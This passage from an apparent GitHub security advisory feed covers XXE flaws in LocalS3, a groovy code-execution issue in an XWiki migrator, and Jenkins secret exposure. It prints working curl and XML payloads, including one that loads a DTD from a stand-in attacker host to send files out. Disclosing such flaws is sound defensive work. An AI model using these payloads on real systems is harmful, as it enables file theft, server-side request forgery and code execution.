-d '&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE data [
&lt;!ENTITY % dtd SYSTEM "http://attacker.domain/evil.dtd"&gt;
%dtd;
]&gt;
&lt;CompleteMultipartUpload&gt;
   &lt;Part&gt;
       &lt;PartNumber&gt;1&lt;/PartNumber&gt;
       &lt;ETag&gt;test&lt;/ETag&gt;
   &lt;/Part&gt;
&lt;/CompleteMultipartUpload&gt;'
</code></pre>
</li>
</ol>
<p>The server will process the XML, load the external DTD, and when evaluating the entities, will read the contents of /etc/hostname and send them to the attacker's server via an HTTP request.</p>
<h2 id="mitigations">Mitigations</h2>
<ul>
<li>Disable DTD processing in the XML parser configuration</li>
<li>If DTD processing is required, disable the ability to load external entities and external DTDs</li>
<li>Implement XML parsing with secure defaults using JAXP's XMLConstants.FEATURE_SECURE_PROCESSING feature</li>
<li>Set up proper input validation and sanitization for all XML processing operations</li>
</ul>
<h2 id="impact">Impact</h2>
<p>An attacker can exploit this vulnerability to read arbitrary files from the server's filesystem and exfiltrate their contents through outbound HTTP requests. The vulnerability requires no authentication and can be exploited by anyone who can send requests to the LocalS3 server. This could lead to exposure of sensitive information including configuration files, credentials, and other confidential data stored on the server.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Robothy/local-s3/security/advisories/GHSA-47qw-ccjm-9c2c">https://github.com/Robothy/local-s3/security/advisories/GHSA-47qw-ccjm-9c2c</a></li>
<li><a href="https://github.com/Robothy/local-s3/commit/d6ed756ceb30c1eb9d4263321ac683d734f8836f">https://github.com/Robothy/local-s3/commit/d6ed756ceb30c1eb9d4263321ac683d734f8836f</a></li>
<li><a href="https://github.com/advisories/GHSA-47qw-ccjm-9c2c">https://github.com/advisories/GHSA-47qw-ccjm-9c2c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-47qw-ccjm-9c2c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-10T18:29:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[io.github.robothy:local-s3-rest] LocalS3 Project Vulnerable to XML External Entity (XXE) Injection via Bucket Tagging API]]></title>
        <id>https://github.com/advisories/GHSA-v232-254c-m6p7</id>
        <link href="https://github.com/advisories/GHSA-v232-254c-m6p7"/>
        <updated>2025-03-10T18:29:28.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>The LocalS3 project, an S3-compatible storage service, is vulnerable to XML External Entity (XXE) injection through its bucket tagging API. The vulnerability exists because the application processes XML input without properly disabling external entity resolution.</p>
<p>When processing XML data for bucket tagging operations, the application allows the definition and resolution of external entities. This vulnerability allows an attacker to read arbitrary files from the server's filesystem by defining an external entity that references local files.</p>
<p>The vulnerability is particularly severe because it allows direct access to sensitive files on the server's filesystem, bypassing any intended access controls. The XXE vulnerability can be exploited to read any file that the application process has access to, potentially exposing sensitive configuration files, credentials, or other confidential information.</p>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<ol>
<li><p>Create a bucket in the LocalS3 service using any S3 client (e.g., AWS CLI, boto3)</p>
</li>
<li><p>Send a PUT request to the bucket tagging endpoint with the following XML payload:</p>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE data [
    &lt;!ENTITY xxe SYSTEM "file:///flag.txt" &gt;
]&gt;
&lt;Tagging&gt;&lt;TagSet&gt;&lt;Tag&gt;&lt;Key&gt;xxe&lt;/Key&gt;&lt;Value&gt;&amp;xxe;&lt;/Value&gt;&lt;/Tag&gt;&lt;/TagSet&gt;&lt;/Tagging&gt;
</code></pre>
<pre><code>curl -X PUT \
     -H "Host: app" \
     -H "Authorization: AWS dummy:dummy" \
     -H "Content-Type: application/xml" \
     --data-binary @xxe.xml \
     http://app/bucket?tagging
</code></pre>
</li>
<li><p>Retrieve the bucket tags using a GET request to the same endpoint</p>
<pre><code>curl -H "Authorization: AWS dummy:dummy" http://app-1/bucket?tagging
</code></pre>
</li>
<li><p>The content of the targeted file will be returned in the tag value</p>
</li>
</ol>
<p>The successful exploitation of this vulnerability results in the contents of sensitive files being disclosed through the XML response, demonstrating the ability to read arbitrary files from the server's filesystem.</p>
<h2 id="mitigations">Mitigations</h2>
<ul>
<li>Disable XML external entity resolution in the XML parser configuration</li>
<li>Implement proper XML parsing security controls such as disabling DTD processing altogether</li>
<li>Use a safe parser configuration that doesn't process external entities or DTDs by default</li>
<li>Validate and sanitize all XML input before processing to prevent injection of malicious entities</li>
</ul>
<h2 id="impact">Impact</h2>
<p>Critical severity vulnerability allowing unauthenticated attackers to read arbitrary files from the server's filesystem. This can lead to exposure of sensitive information, configuration files, and system data, potentially enabling further attacks against the system. The impact is heightened by the fact that the vulnerability requires minimal technical knowledge to exploit and can be triggered through standard S3 API operations.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Robothy/local-s3/security/advisories/GHSA-v232-254c-m6p7">https://github.com/Robothy/local-s3/security/advisories/GHSA-v232-254c-m6p7</a></li>
<li><a href="https://github.com/Robothy/local-s3/commit/d6ed756ceb30c1eb9d4263321ac683d734f8836f">https://github.com/Robothy/local-s3/commit/d6ed756ceb30c1eb9d4263321ac683d734f8836f</a></li>
<li><a href="https://github.com/advisories/GHSA-v232-254c-m6p7">https://github.com/advisories/GHSA-v232-254c-m6p7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v232-254c-m6p7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-10T18:29:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[io.github.robothy:local-s3-rest] LocalS3 Project Bucket Operations Vulnerable to XML External Entity (XXE) Injection]]></title>
        <id>https://github.com/advisories/GHSA-2466-4485-4pxj</id>
        <link href="https://github.com/advisories/GHSA-2466-4485-4pxj"/>
        <updated>2025-03-10T18:29:07.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>The LocalS3 project contains an XML External Entity (XXE) Injection vulnerability in its bucket operations that process XML data. Specifically, the vulnerability exists in the bucket ACL and bucket tagging operations. The application processes XML input without properly disabling external entity resolution, allowing an attacker to read arbitrary files from the server's filesystem.</p>
<p>The vulnerability occurs because the XML parser used by the application processes DOCTYPE declarations and allows external entity references. When processing bucket ACL or tagging operations, the application includes the content of external entities in its response, effectively exposing sensitive files from the server.</p>
<p>This type of vulnerability can be exploited to read sensitive files, perform server-side request forgery (SSRF), or potentially achieve denial of service through various XXE attack vectors.</p>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<ol>
<li><p>Create a test bucket using PUT request to http://[server]/[bucket-name]</p>
<pre><code>curl -X PUT "http://app/xxe-test-bucket2"```
</code></pre>
</li>
<li><p>Send a PUT request to http://[server]/[bucket-name]?acl with the following XXE payload:</p>
<pre><code>curl -X PUT "http://app/xxe-test-bucket2?acl" \
-H "Content-Type: application/xml" \
-d '&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE AccessControlPolicy [
    &lt;!ENTITY xxe SYSTEM "file:///etc/hostname" &gt;
]&gt;
&lt;AccessControlPolicy&gt;
    &lt;Owner&gt;
        &lt;ID&gt;&amp;xxe;&lt;/ID&gt;
        &lt;DisplayName&gt;test&lt;/DisplayName&gt;
    &lt;/Owner&gt;
    &lt;AccessControlList&gt;
        &lt;Grant&gt;
            &lt;Grantee xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="CanonicalUser"&gt;
                &lt;ID&gt;test&lt;/ID&gt;
                &lt;DisplayName&gt;test&lt;/DisplayName&gt;
            &lt;/Grantee&gt;
            &lt;Permission&gt;FULL_CONTROL&lt;/Permission&gt;
        &lt;/Grant&gt;
    &lt;/AccessControlList&gt;
&lt;/AccessControlPolicy&gt;'
</code></pre>
</li>
<li><p>Send a GET request to <code>http://[server]/[bucket-name]?acl</code> to retrieve the bucket ACL</p>
<pre><code>curl "http://app/xxe-test-bucket2?acl"
</code></pre>
</li>
</ol>
<p>After performing these steps, the content of the target file (/flag.txt in this case) will be included in the response within the ID field of the Owner element.</p>
<h2 id="mitigations">Mitigations</h2>
<ul>
<li>Configure the XML parser to disable external entity resolution by setting XMLConstants.FEATURE_SECURE_PROCESSING to true</li>
<li>Disable DOCTYPE declarations in the XML parser configuration</li>
<li>Implement XML input validation and sanitization before processing</li>
<li>Consider using JSON instead of XML for these operations if XML parsing is not strictly necessary</li>
</ul>
<h2 id="impact">Impact</h2>
<p>The vulnerability requires no authentication and can be exploited by any user who can make HTTP requests to the server. It allows reading arbitrary files from the server's filesystem, which could expose sensitive configuration files, credentials, or other confidential information. The vulnerability can also be used to perform SSRF attacks against internal systems.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Robothy/local-s3/security/advisories/GHSA-2466-4485-4pxj">https://github.com/Robothy/local-s3/security/advisories/GHSA-2466-4485-4pxj</a></li>
<li><a href="https://github.com/Robothy/local-s3/commit/d6ed756ceb30c1eb9d4263321ac683d734f8836f">https://github.com/Robothy/local-s3/commit/d6ed756ceb30c1eb9d4263321ac683d734f8836f</a></li>
<li><a href="https://github.com/advisories/GHSA-2466-4485-4pxj">https://github.com/advisories/GHSA-2466-4485-4pxj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2466-4485-4pxj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-10T18:29:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[io.github.robothy:local-s3-rest] LocalS3 CreateBucketConfiguration Endpoint XML External Entity (XXE) Injection]]></title>
        <id>https://github.com/advisories/GHSA-g6wm-2v64-wq36</id>
        <link href="https://github.com/advisories/GHSA-g6wm-2v64-wq36"/>
        <updated>2025-03-10T18:24:36.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>The LocalS3 service's bucket creation endpoint is vulnerable to XML External Entity (XXE) injection. When processing the CreateBucketConfiguration XML document during bucket creation, the service's XML parser is configured to resolve external entities. This allows an attacker to declare an external entity that references an internal URL, which the server will then attempt to fetch when parsing the XML.</p>
<p>The vulnerability specifically occurs in the location constraint processing, where the XML parser resolves external entities without proper validation or restrictions. When the external entity is resolved, the server makes an HTTP request to the specified URL and includes the response content in the parsed XML document.</p>
<p>This vulnerability can be exploited to perform server-side request forgery (SSRF) attacks, allowing an attacker to make requests to internal services or resources that should not be accessible from external networks. The server will include the responses from these internal requests in the resulting bucket configuration, effectively leaking sensitive information.</p>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<ol>
<li>Create an XML document that includes an external entity declaration pointing to the internal target:</li>
</ol>
<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "http://internal-web/flag.txt"&gt; ]&gt;
&lt;CreateBucketConfiguration&gt;
    &lt;LocationConstraint&gt;&amp;xxe;&lt;/LocationConstraint&gt;
&lt;/CreateBucketConfiguration&gt;
</code></pre>
<ol start="2">
<li>Send a PUT request to create a new bucket with this configuration:</li>
</ol>
<pre><code class="language-bash">curl -X PUT http://app/test-bucket-2 -H 'Content-Type: application/xml' -d @payload.xml
</code></pre>
<ol start="3">
<li>Retrieve the bucket location to see the resolved entity content:</li>
</ol>
<pre><code class="language-bash">curl http://app/test-bucket-2/?location
</code></pre>
<p>When these steps are executed, the server processes the XML, resolves the external entity by making a request to the internal URL, and includes the response in the bucket's location constraint. The attacker can then retrieve this information through the bucket location endpoint.</p>
<h2 id="mitigations">Mitigations</h2>
<ul>
<li>Disable XML external entity resolution in the XML parser configuration. Most XML parsers have options to disable external entity processing.</li>
<li>Implement proper input validation for XML documents, rejecting those that contain DOCTYPE declarations or external entity references.</li>
<li>Use XML parsers that are configured securely by default and don't process external entities.</li>
<li>If external entity processing is required, implement a whitelist of allowed URLs and validate all URLs before making any requests.</li>
</ul>
<h2 id="impact">Impact</h2>
<p>The vulnerability allows unauthenticated attackers to make the server perform HTTP requests to internal networks and services, potentially exposing sensitive information or enabling further attacks against internal systems. The attacker only needs to be able to send HTTP requests to the LocalS3 service to exploit this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Robothy/local-s3/security/advisories/GHSA-g6wm-2v64-wq36">https://github.com/Robothy/local-s3/security/advisories/GHSA-g6wm-2v64-wq36</a></li>
<li><a href="https://github.com/Robothy/local-s3/commit/d6ed756ceb30c1eb9d4263321ac683d734f8836f">https://github.com/Robothy/local-s3/commit/d6ed756ceb30c1eb9d4263321ac683d734f8836f</a></li>
<li><a href="https://github.com/advisories/GHSA-g6wm-2v64-wq36">https://github.com/advisories/GHSA-g6wm-2v64-wq36</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g6wm-2v64-wq36</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-10T18:24:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[com.xwiki.confluencepro:application-confluence-migrator-pro-ui] com.xwiki.confluencepro:application-confluence-migrator-pro-ui's application homepage is public]]></title>
        <id>https://github.com/advisories/GHSA-3w9f-2pph-j5vc</id>
        <link href="https://github.com/advisories/GHSA-3w9f-2pph-j5vc"/>
        <updated>2025-03-07T19:16:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The homepage of the application is public which enables a guest to download the package which might contain sensitive information.</p>
<h3 id="patches">Patches</h3>
<p>1.11.7</p>
<h3 id="workarounds">Workarounds</h3>
<p>The access to the page can be manually restricted to a specific set of users or groups.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/xwikisas/application-confluence-migrator-pro/security/advisories/GHSA-3w9f-2pph-j5vc">https://github.com/xwikisas/application-confluence-migrator-pro/security/advisories/GHSA-3w9f-2pph-j5vc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27604">https://nvd.nist.gov/vuln/detail/CVE-2025-27604</a></li>
<li><a href="https://github.com/xwikisas/application-confluence-migrator-pro/commit/6ced42b1f341fd0ce6734fc58c7d694da5f365fb">https://github.com/xwikisas/application-confluence-migrator-pro/commit/6ced42b1f341fd0ce6734fc58c7d694da5f365fb</a></li>
<li><a href="https://github.com/advisories/GHSA-3w9f-2pph-j5vc">https://github.com/advisories/GHSA-3w9f-2pph-j5vc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3w9f-2pph-j5vc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-07T16:19:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[com.xwiki.confluencepro:application-confluence-migrator-pro-ui] com.xwiki.confluencepro:application-confluence-migrator-pro-ui Remote Code Execution via unescaped translations]]></title>
        <id>https://github.com/advisories/GHSA-6qvp-39mm-95v8</id>
        <link href="https://github.com/advisories/GHSA-6qvp-39mm-95v8"/>
        <updated>2025-03-07T19:16:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A user that doesn't have programming rights can execute arbitrary code when creating a page using the Migration Page template.
A possible attack vector is the following:</p>
<ul>
<li>Create a page and add the following content:</li>
</ul>
<pre><code>confluencepro.job.question.advanced.input={{/html}} {{async async="true" cached="false" context="doc.reference"}}{{groovy}}println("hello from groovy!"){{/groovy}}{{/async}}
</code></pre>
<ul>
<li>Use the object editor to add an object of type <code>XWiki.TranslationDocumentClass</code> with scope <code>USER</code>.</li>
<li>Access an unexisting page using the <code>MigrationTemplate</code></li>
</ul>
<pre><code>http://localhost:8080/xwiki/bin/edit/Page123?template=ConfluenceMigratorPro.Code.MigrationTemplate
</code></pre>
<p>It is expected that <code>{{/html}} {{async async="true" cached="false" context="doc.reference"}}{{groovy}}println("hello from groovy!"){{/groovy}}{{/async}}</code> will be present on the page, however, <code>hello from groovy</code> will be printed.</p>
<h3 id="patches">Patches</h3>
<p>The issue will be fixed as part of v1.2. The fix was added with commit <a href="https://github.com/xwikisas/application-confluence-migrator-pro/commit/36cef2271bd429773698ca3a21e47b6d51d6377d">35cef22</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no known workarounds besides upgrading.</p>
<h3 id="references">References</h3>
<p>No references.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/xwikisas/application-confluence-migrator-pro/security/advisories/GHSA-6qvp-39mm-95v8">https://github.com/xwikisas/application-confluence-migrator-pro/security/advisories/GHSA-6qvp-39mm-95v8</a></li>
<li><a href="https://github.com/xwikisas/application-confluence-migrator-pro/commit/36cef2271bd429773698ca3a21e47b6d51d6377d">https://github.com/xwikisas/application-confluence-migrator-pro/commit/36cef2271bd429773698ca3a21e47b6d51d6377d</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27603">https://nvd.nist.gov/vuln/detail/CVE-2025-27603</a></li>
<li><a href="https://github.com/advisories/GHSA-6qvp-39mm-95v8">https://github.com/advisories/GHSA-6qvp-39mm-95v8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6qvp-39mm-95v8</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-03-07T16:07:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.jenkins-ci.main:jenkins-core] Jenkins reveals encrypted values of secrets stored in agent configuration to users with Agent/Extended Read permission]]></title>
        <id>https://github.com/advisories/GHSA-p34j-r3ch-c985</id>
        <link href="https://github.com/advisories/GHSA-p34j-r3ch-c985"/>
        <updated>2025-03-06T22:30:09.000Z</updated>
        <content type="html"><![CDATA[<p>Jenkins 2.499 and earlier, LTS 2.492.1 and earlier does not redact encrypted values of secrets when accessing <code>config.xml</code> of agents via REST API or CLI.</p>
<p>This allows attackers with Agent/Extended Read permission to view encrypted values of secrets.</p>
<p>Jenkins 2.500, LTS 2.492.2 redacts the encrypted values of secrets stored in agent <code>config.xml</code> accessed via REST API or CLI for users lacking Agent/Configure permission.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27622">https://nvd.nist.gov/vuln/detail/CVE-2025-27622</a></li>
<li><a href="https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3495">https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3495</a></li>
<li><a href="https://github.com/jenkinsci/jenkins/commit/923cdbc165e8b8523ae960dfee5f7354878532d5">https://github.com/jenkinsci/jenkins/commit/923cdbc165e8b8523ae960dfee5f7354878532d5</a></li>
<li><a href="https://github.com/advisories/GHSA-p34j-r3ch-c985">https://github.com/advisories/GHSA-p34j-r3ch-c985</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p34j-r3ch-c985</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-06T00:31:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.jenkins-ci.main:jenkins-core] Jenkins reveals encrypted values of secrets stored in agent configuration to users with Agent/Extended Read permission]]></title>
        <id>https://github.com/advisories/GHSA-p34j-r3ch-c985</id>
        <link href="https://github.com/advisories/GHSA-p34j-r3ch-c985"/>
        <updated>2025-03-06T22:30:09.000Z</updated>
        <content type="html"><![CDATA[<p>Jenkins 2.499 and earlier, LTS 2.492.1 and earlier does not redact encrypted values of secrets when accessing <code>config.xml</code> of agents via REST API or CLI.</p>
<p>This allows attackers with Agent/Extended Read permission to view encrypted values of secrets.</p>
<p>Jenkins 2.500, LTS 2.492.2 redacts the encrypted values of secrets stored in agent <code>config.xml</code> accessed via REST API or CLI for users lacking Agent/Configure permission.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27622">https://nvd.nist.gov/vuln/detail/CVE-2025-27622</a></li>
<li><a href="https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3495">https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3495</a></li>
<li><a href="https://github.com/jenkinsci/jenkins/commit/923cdbc165e8b8523ae960dfee5f7354878532d5">https://github.com/jenkinsci/jenkins/commit/923cdbc165e8b8523ae960dfee5f7354878532d5</a></li>
<li><a href="https://github.com/advisories/GHSA-p34j-r3ch-c985">https://github.com/advisories/GHSA-p34j-r3ch-c985</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p34j-r3ch-c985</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-06T00:31:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.jenkins-ci.main:jenkins-core] Jenkins reveals encrypted values of secrets stored in agent configuration to users with Agent/Extended Read permission]]></title>
        <id>https://github.com/advisories/GHSA-rfh6-9r2q-98vf</id>
        <link href="https://github.com/advisories/GHSA-rfh6-9r2q-98vf"/>
        <updated>2025-03-06T22:29:54.000Z</updated>
        <content type="html"><![CDATA[<p>Jenkins 2.499 and earlier, LTS 2.492.1 and earlier does not redact encrypted values of secrets when accessing <code>config.xml</code> of views via REST API or CLI.</p>
<p>This allows attackers with View/Read permission to view encrypted values of secrets.</p>
<p>Jenkins 2.500, LTS 2.492.2 redacts the encrypted values of secrets stored in view <code>config.xml</code> accessed via REST API or CLI for users lacking View/Configure permission.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27623">https://nvd.nist.gov/vuln/detail/CVE-2025-27623</a></li>
<li><a href="https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3496">https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3496</a></li>
<li><a href="https://github.com/jenkinsci/jenkins/commit/923cdbc165e8b8523ae960dfee5f7354878532d5">https://github.com/jenkinsci/jenkins/commit/923cdbc165e8b8523ae960dfee5f7354878532d5</a></li>
<li><a href="https://github.com/advisories/GHSA-rfh6-9r2q-98vf">https://github.com/advisories/GHSA-rfh6-9r2q-98vf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rfh6-9r2q-98vf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-06T00:31:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.jenkins-ci.main:jenkins-core] Jenkins reveals encrypted values of secrets stored in agent configuration to users with Agent/Extended Read permission]]></title>
        <id>https://github.com/advisories/GHSA-rfh6-9r2q-98vf</id>
        <link href="https://github.com/advisories/GHSA-rfh6-9r2q-98vf"/>
        <updated>2025-03-06T22:29:54.000Z</updated>
        <content type="html"><![CDATA[<p>Jenkins 2.499 and earlier, LTS 2.492.1 and earlier does not redact encrypted values of secrets when accessing <code>config.xml</code> of views via REST API or CLI.</p>
<p>This allows attackers with View/Read permission to view encrypted values of secrets.</p>
<p>Jenkins 2.500, LTS 2.492.2 redacts the encrypted values of secrets stored in view <code>config.xml</code> accessed via REST API or CLI for users lacking View/Configure permission.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27623">https://nvd.nist.gov/vuln/detail/CVE-2025-27623</a></li>
<li><a href="https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3496">https://www.jenkins.io/security/advisory/2025-03-05/#SECURITY-3496</a></li>
<li><a href="https://github.com/jenkinsci/jenkins/commit/923cdbc165e8b8523ae960dfee5f7354878532d5">https://github.com/jenkinsci/jenkins/commit/923cdbc165e8b8523ae960dfee5f7354878532d5</a></li>
<li><a href="https://github.com/advisories/GHSA-rfh6-9r2q-98vf">https://github.com/advisories/GHSA-rfh6-9r2q-98vf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rfh6-9r2q-98vf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-06T00:31:56.000Z</published>
    </entry>
</feed>